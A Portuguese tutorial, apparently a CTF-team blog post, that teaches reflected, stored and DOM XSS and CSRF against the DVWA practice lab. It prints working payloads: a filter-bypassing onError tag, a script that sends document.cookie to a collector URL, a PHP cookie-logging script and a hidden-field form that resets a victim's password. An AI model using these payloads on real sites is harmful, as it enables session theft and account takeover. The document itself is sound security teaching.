# Wtf is xss?
Após adentrar o mundo do desenvolvimento web, percebe-se que a quantidade de vulnerabilidades existentes por falhas no código ou até mesmo falta de atenção de quem o fez são inúmeras. Uma das mais famosas e mais utilizadas por usuários mal-intencionados é o Xss. **xss** ou **Cross-site Scripting** é um tipo de injeção de código malicioso em forma de script, normalmente em uma aplicação web. Os ataques são difundidos, e ocorrem quando uma sequência de códigos [Client-side](https://pt.wikipedia.org/wiki/Client-side_script) são enviados para o servidor e o mesmo não realiza nenhuma validação ou filtragem do que foi passado.
## Como funciona?
imagine a seguinte situação:  Você desenvolve sua aplicação web, e nesta põe um campo para *feedback* público. Por ser um ótimo ouvinte ( e um ótimo descuidado ), você cria um código simples para recebimento deste feedback, e no mesmo pede para que o autor da crítica se identifique, caso queira agradecer futuramente.

    <?php          
    // Is there any input?  
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {  
    // Cumprimentos ao usuário final  
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';  
    }  
    ?>
sua saída:

![dvwa-screenshot](https://i.imgur.com/McgPMRe.png)

*"ok, funcionando normalmente, Qual o problema?"*
Vejamos o que ocorre caso tentemos inserir um código javascript no campo do nome.

    <script>alert("Eliabe")</script>

![Xss](https://i.imgur.com/5kPoRK5.png)

O código foi interpretado e executado. Partindo deste ponto, a exploração pode tomar diversos rumos, que vão de um **alert** à um roubo de sessão.

## Vertentes e aplicações

O cross-site scripting, assim como outras vulnerabilidades, tem suas limitações e vertentes, e para fins de estudos, iremos abordar **"3"** delas:

* Stored
* Reflected
* DOM
### XSS (Reflected) 
O xss refletido leva a aplicação ao pé da letra. Nosso código malicioso é refletido no servidor web, como uma Mensagem de erro X, resultado de alguma pesquisa Y ou qualquer outra resposta Z que inclua entradas enviadas ao servidor como parte da request.

---
*antes de continuarmos, caso haja a vontade de seguir os passos, o ambiente controlado utilizado para testes e exemplificação da maioria dos casos é o **[Dvwa](http://www.dvwa.co.uk/)*** 

---

Certo, tomadas as devidas medidas, vejamos um outro exemplo de código vulnerável à nossa injeção.

Indo um pouco além de nossa última execução, vamos tentar alternativas à exibição de um nome na tela, pois cá entre nós, um nome na tela não põe medo **( a não ser que seja "wannacry ).**
Vejamos uma simulação do que ocorre caso queiramos fazer um roubo de **Cookies**.

Certo, primeiro, criemos uma simples página html com código javascript em seu corpo:

    <!DOCTYPE html>
    <html>
    <body>
    <script type ="text/javascript"> 
    document.location = 'http://127.0.0.1/passaocookie.php?pwn=' + document.cookie; 
    </script>
    <script type="text/javascript">
    document.cookie = "username=Deadlock";
    document.write(document.cookie);
    </script>
    </body>
    </html>

sua saída deve ser a escrita de *username=Deadlock*.

**" *Ah, mas quem é que vai por um código assim na página?"***

Creio que ninguém, mas, sabendo que há como fazer injeção de código, Você mesmo pode fazer a injeção dele na página. Duvidas? ok, vamos ao **Dvwa** simular a situação.

o código:

    <script>document.location = 'http://127.0.0.1/passaocookie.php?c=' + document.cookie;</script>

a saída:

![the error](https://i.imgur.com/HOlWi2s.png)

Então não, não é tão impossível quanto parece. Sigamos!

---

 Certo, criemos agora um script php responsável por realizar o roubo dos cookies.

    <?php  
    header ('Location:https://deadlock.team');
            $cookies = $_GET["pwn"];
            $file = fopen('saida.txt', 'a');
            fwrite($file, $cookies . "\n\n");
    ?>

Ao abrirmos a página html, imediatamente somos redirecionados ao site [Deadlock.team](https://Deadlock.team). Porém, ao observarmos o log de acesso com o php, temos a seguinte resposta:

![cookiestealer](https://i.imgur.com/IO9v7yv.png)

E cá está nosso cookie roubado.

---
Porém, caso não consigamos executar as tags  `<script>`, precisamos de outro modo de ter execução de código no servidor. Vejamos algum exemplo.

 **(Para obter o mesmo ambiente, caso utilizando o **dvwa**, basta elevar o nível para *Difícil* )**.
`<script>alert("Eliabe")</script>`

![enter image description here](https://i.imgur.com/Gkqh20i.png)

Nosso código utilizado previamente não funcionou, vejamos a verificação por baixo dos panos.

    `<?php      
    header ("X-XSS-Protection: 0");       
    // Is there any input?  
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {  
    // Get input  
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );  
    // Feedback for end user  
    echo "<pre>Hello ${name}</pre>";  
    }  
    ?>`
Na source, podemos visualizar a função **preg-replace** do PHP, sendo utilizada para realizar um regex e desabilitar a execução de scripts. Nosso código anterior não funcionava, pois ele está substituindo os caracteres inválidos por um espaço em branco.

`$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); `

Neste caso, temos que apelar para outra função que nos retorne execução de código na aplicação. Para fins de exemplo, vejamos como o **onError** Lida com códigos.

`<img src="pwn" onError=alert("1ml33t")`

A saída:

![bypass](https://i.imgur.com/gUArsoK.png)

## Xss (Stored)
xss stored ( *ou persistente* ) é aquele em que o script injetado é armazenado permanentemente nos servidores de destino, como em um banco de dados, em um fórum de mensagens, registro de visitantes, campo de comentários etc. E, para que outro usuário qualquer seja afetado pelo código malicioso, basta acessar a página onde o mesmo foi injetado.

Vejamos como funciona:

    <?php  
      
    if( isset( $_POST[ 'btnSign' ] ) ) {  
    // Get input  
    $message = trim( $_POST[ 'mtxMessage' ] );  
    $name = trim( $_POST[ 'txtName' ] );  
      
    // Sanitize message input  
    $message = strip_tags( addslashes( $message ) );  
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
    $message = htmlspecialchars( $message );  
      
    // Sanitize name input  
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );  
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));  
      
    // Update database  
    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";  
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );  
      
    //mysql_close();  
    }  
      
    ?>

podemos ver uma má verificação de código com inserção direta. Tendo em vista que nosso código javascript será armazenado permanentemente no servidor, façamos o teste:

* para prosseguir, alteremos o **maxlength=10**  para **maxlength=100**, para assim termos uma quantidade maior de caracteres à injetar.

![length](https://i.imgur.com/Bco8c8l.png)

O código:

![stored-code](https://i.imgur.com/u366pfl.png)

a saída:

![stored](https://i.imgur.com/DcUfhCM.png)

Agora, todos que acessarem a página onde o código foi inserido [no caso exemplo,  **localhost/dvwa/vulnerabilities/xss_s/**] receberá a mensagem de alerta. 
E caso você se pergunte: "***Será que o exemplo do cookie funciona?"***
sim, ( in )Felizmente, causando assim um problemão na vida do usuário despercebido, comprometendo sua sessão em um ambiente X.

## XSS (DOM)

O XSS baseado em [DOM](https://tableless.com.br/entendendo-o-dom-document-object-model/) é um ataque XSS em que o payload de ataque é executado como resultado da modificação do “ambiente” DOM no navegador da vítima usado pelo script original do lado do cliente, para que o código do cliente seja executado de maneira “inesperada”. Ou seja, a própria página (a resposta HTTP) não é alterada, mas o código do lado do cliente contido na página é executado de forma diferente devido às modificações mal-intencionadas ocorridas no ambiente DOM. Em ataques de xss  reflected e stored, é possível ver a exploração da vulnerabilidade na página de resposta, mas no script baseado em DOM, o código-fonte *HTML* e a resposta do ataque serão exatamente os mesmos, ou seja, o payload não pode ser encontrado na resposta. Ele só pode ser observado em tempo de execução ou investigando o DOM da página.

Vejamos na prática:

![enter image description here](https://i.imgur.com/KJJHVTi.png)

url:

    localhost/dvwa/vulnerabilities/xss_d/?default=French

No exemplo acima, vemos que existe um campo para selecionar opções de idioma, mas nenhum campo para comentários ou coisa do tipo.
Neste caso, iremos abusar do [GET method](https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Methods/GET).

Analisando a source das opções, vemos o seguinte código:

![enter image description here](https://i.imgur.com/G1u6AmI.png)

Nossa injeção:

    localhost/dvwa/vulnerabilities/xss_d/?default=French<script>alert('12')</script>

![description](https://i.imgur.com/u8zKsTa.png)

e cá está nossa execução!

![enter image description here](https://i.imgur.com/meWx4Yv.png)

---
Seguindo a linha de Cross-site, segue uma exemplificação do ***CSRF***(Cross-site request forgery) é um ataque que, ao contrário do *xss* comum, o *csrf* explora a confiança que um website tem do navegador do usuário. O ataque funciona através da inclusão de um link ou script malicioso em uma página que acede a um site no qual se sabe (ou se supõe) que o utilizador tenha sido autenticado.
Por exemplo, imagine que um usuário **X** está acessando um site qualquer, como o [Hackaflag](https://www.hackaflag.com.br/), porém, um usuário muito esperto conseguiu uma execução de XSS stored na plataforma. Esse usuário esperto e malicioso inseriu um script de redirecionamento para uma página forjada dele, onde existe apenas um botão **"Clique aqui para continuar"**. O usuario **X**, por não ter feito o [Hackaflag Academy](https://academy.hackaflag.com.br/) ou participado dos [Desafios semanais](https://ctf.hackaflag.com.br/challengeweek/level01/), clica neste botão com toda sua força e dedicação. Ao clicar, o script malicioso é acionado, e a página que possuia o botão, na verdade, era uma página que fazia a redefinição de senha da conta do usuário **X**.

Uma triste história, não? Bem, vejamos na prática como seria:

Como visto acima, podemos utilizar o **document.location** para criar um redirecionamento de páginas. Pois bem, façamos o mesmo neste caso.

    <script>document.location = 'http://127.0.0.1/confiavel.html</script>

 O código de **confiável.html** precisa realizar a request original de redefinição de senha. 

No exemplo *dvwa*:

    <form action="#" method="GET">
    
    New password:<br />
    
    <input type="password" AUTOCOMPLETE="off" name="password_new"><br />
    
    Confirm new password:<br />
    
    <input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
    
    <br />
    
    <input type="submit" value="Change" name="Change">
    
    </form>

Façamos algumas pequenas modificações:

    <body>
    <style type="text/css">
        body {
      background-color: orange;
    }
        form {
            text-align: center;
        }
    </style>
    <form action="http://localhost/dvwa/vulnerabilities/csrf/?" method="GET">
                <h1>Clique aqui para continuar</h1>
                <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="deadlock">
                <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="deadlock">
                <input type="submit" value="continuar" name="Change">
    
            </form>
    </body>

* modificada a aparência para não parecer tão estranha assim para o usuário X ( O que não funcionou muito )
* na action do formulário, é passada a url responsável por fazer a redefinição de senha após receber os parâmetros via **GET**
* Os tipos de campos de senha foram alterados para **hidden**, assim, nada além do botão de ação será exibido/necessário para realizar nosso ataque.
* Os valores de campos foram alterados para *deadlock* assim, nada precisa ser digitado, pois a redefinição possui seu padrão.

A página:

![csrf](https://i.imgur.com/YEf3Sb0.png)


Ao enviarmos o código de redirecionamento com *XSS stored* para a página exemplo, somos redirecionados à nossa tela laranja totalmente confiável.

Ao clicarmos no botão confiável:

![enter image description here](https://i.imgur.com/sIMX6wx.png)
 
 a lógica de redefinição de senha, neste caso, parte da mesma de fazer uma requisição de redefinição de senha por e-mail. A plataforma qual solicitada, normalmente, envia um link que leva o usuário diretamente à uma página para por suas novas credenciais. O que fazemos é, após ter acesso à esse link que leva à troca de credenciais, criar uma falsa requisição de página, levando o usuário à fazer modificações que sequer requisitou, utilizando da herança de identidade e privilégios.
 
---
Com isto, finalizamos uma breve introdução ao Cross-site scripting.
Como é sempre bom lembrar, estes não são os únicos métodos de injeção de código, a diversidade é imensa:

* **body onload**
*  **onmouseover**
*  **img src**
Sem contar os métodos de possíveis bypass em filtros:
* **uso entidades html. ex javascript:alert(`&quot`;XSS`&quot`;)** 
* **Conversão em charcode. ex: javascript:alert(String.fromCharCode (88,83,83))**

Estes e outros métodos podem ser encontrados [aqui](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). Tendo assim, um vasto leque de possibilidades para exploração. Espero que, de alguma maneira, esta postagem lhe seja útil na vida, ou em algum ctf mundo afora. No demais,  **Lets  [pwn](https://github.com/d1stopic/writeups/tree/master/pwn)  the world!**

---
### Referências
* [Cross-site scripting by OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))


---
**A vida é bela, e hacker hackeia.**
-Shakespeare,W. 1610